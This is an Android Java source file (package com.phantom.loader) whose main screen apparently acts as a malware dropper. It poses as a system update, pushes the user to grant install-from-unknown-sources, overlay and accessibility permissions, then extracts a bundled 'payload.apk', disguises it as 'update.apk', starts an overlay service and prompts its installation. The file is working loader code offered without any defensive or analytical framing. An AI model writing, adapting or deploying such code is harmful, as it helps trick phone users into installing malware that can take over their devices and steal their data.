package com.phantom.loader;

import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.FileProvider;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(50, 100, 50, 50);

        TextView tv = new TextView(this);
        tv.setText("Sistema Pronto. Iniciando atualização...");
        layout.addView(tv);

        Button btn = new Button(this);
        btn.setText("Iniciar");
        btn.setOnClickListener(v -> pedirPermissoes());
        layout.addView(btn);
        setContentView(layout);
    }

    private void pedirPermissoes() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && !getPackageManager().canRequestPackageInstalls()) {
            startActivity(new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES, Uri.parse("package:" + getPackageName())));
            Toast.makeText(this, "Permita a instalação.", Toast.LENGTH_LONG).show();
            return;
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            startActivity(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName())));
            Toast.makeText(this, "Permita sobrepor outros apps.", Toast.LENGTH_LONG).show();
            return;
        }

        startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
        Toast.makeText(this, "Ative a acessibilidade.", Toast.LENGTH_LONG).show();

        extrairPayload();
    }

    private void extrairPayload() {
        new Thread(() -> {
            try {
                InputStream is = getAssets().open("payload.apk");
                File file = new File(getExternalFilesDir(null), "update.apk");
                FileOutputStream fos = new FileOutputStream(file);
                byte[] buffer = new byte[1024];
                int len;
                while ((len = is.read(buffer)) != -1) { fos.write(buffer, 0, len); }
                fos.close();
                is.close();

                runOnUiThread(() -> {
                    startService(new Intent(this, OverlayService.class));
                    Uri apkUri = FileProvider.getUriForFile(this, getPackageName() + ".fileprovider", file);
                    Intent intent = new Intent(Intent.ACTION_VIEW);
                    intent.setDataAndType(apkUri, "application/vnd.android.package-archive");
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_GRANT_READ_URI_PERMISSION);
                    startActivity(intent);
                });
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
}
